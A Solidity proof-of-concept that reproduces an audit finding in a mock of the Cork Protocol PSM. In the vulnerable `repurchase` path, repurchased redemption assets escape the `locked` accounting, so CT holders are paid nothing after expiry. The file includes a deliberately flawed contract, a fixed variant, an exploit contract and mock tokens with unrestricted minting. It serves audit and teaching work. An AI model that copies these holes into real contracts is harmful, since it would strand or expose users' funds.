// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Cork Protocol — H-5 (Sherlock 2024-08, issue 126)
    repurchase pulls redemption assets with lockUnchecked, so `locked` does
    not increase. After expiry, _separateLiquidity archives only `locked`.
    The repurchased RA stays in the PSM and redeemWithCt pays 0. */

contract Token {
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory s) {
        symbol = s;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function burn(address from, uint256 amount) external {
        balanceOf[from] -= amount;
        totalSupply -= amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Psm {
    Token public ra;
    Token public pa;
    Token public ct;
    Token public ds;
    uint256 public locked;
    uint256 public free;
    uint256 public archivedRa;
    uint256 public expiry;
    bool public liquiditySeparated;

    constructor(Token _ra, Token _pa, Token _ct, Token _ds) {
        ra = _ra;
        pa = _pa;
        ct = _ct;
        ds = _ds;
        expiry = block.timestamp;
    }

    function lockFrom(uint256 amount, address from) internal {
        locked += amount;
        ra.transferFrom(from, address(this), amount);
    }

    function lockUnchecked(uint256 amount, address from) internal {
        ra.transferFrom(from, address(this), amount); // @> VULN: [S2] repurchase uses lockUnchecked, so locked is not increased.
        // FIX: call lockFrom, which does locked += amount before the transfer.
    }

    function unlockTo(address to, uint256 amount) internal {
        locked -= amount;
        ra.transfer(to, amount);
    }

    function deposit(uint256 amount) external {
        lockFrom(amount, msg.sender); // [S1]
        ct.mint(msg.sender, amount);
        ds.mint(msg.sender, amount);
    }

    function redeemWithDsPa(uint256 amount) external {
        ds.burn(msg.sender, amount);
        require(pa.transferFrom(msg.sender, address(this), amount), "pa");
        unlockTo(msg.sender, amount);
    }

    function repurchase(uint256 amount) external {
        lockUnchecked(amount, msg.sender);
        require(pa.transfer(msg.sender, amount), "pa out");
        ds.mint(msg.sender, amount);
    }

    function repurchaseFixed(uint256 amount) external {
        lockFrom(amount, msg.sender);
        require(pa.transfer(msg.sender, amount), "pa out");
        ds.mint(msg.sender, amount);
    }

    function convertAllToFree() internal returns (uint256 available) {
        available = locked; // [S4]
        free = locked;
        locked = 0;
    }

    function separateLiquidity() external {
        require(block.timestamp >= expiry, "not expired");
        require(!liquiditySeparated, "done");
        uint256 availableRa = convertAllToFree();
        archivedRa = availableRa; // [S5]
        locked = 0;
        liquiditySeparated = true;
    }

    function redeemWithCt(uint256 amount) external returns (uint256 raOut) {
        uint256 supply = ct.totalSupply();
        raOut = supply == 0 ? 0 : archivedRa * amount / supply;
        ct.burn(msg.sender, amount);
        if (raOut != 0) ra.transfer(msg.sender, raOut);
    }
}

contract Exploit {
    Token public ra; // nonce 1
    Token public pa; // nonce 2
    Token public ct; // nonce 3
    Token public ds; // nonce 4
    Psm public psm; // nonce 5
    uint256 public constant AMOUNT = 1000 ether;
    uint256 public ctPaid;
    uint256 public stuck;

    constructor() {
        ra = new Token("RA");
        pa = new Token("PA");
        ct = new Token("CT");
        ds = new Token("DS");
        psm = new Psm(ra, pa, ct, ds);
        ra.mint(address(this), AMOUNT);
        pa.mint(address(this), AMOUNT);
        ra.approve(address(psm), type(uint256).max);
        pa.approve(address(psm), type(uint256).max);
    }

    function run() external {
        psm.deposit(AMOUNT);
        psm.redeemWithDsPa(AMOUNT);
        psm.repurchase(AMOUNT); // [S3]
        psm.separateLiquidity();
        ctPaid = psm.redeemWithCt(AMOUNT); // [S6]
        stuck = ra.balanceOf(address(psm));
        require(psm.archivedRa() == 0, "archive missed the repurchase");
        require(ctPaid == 0, "CT was paid from untracked RA");
        require(stuck == AMOUNT, "1000 RA stuck in the PSM");
    }
}
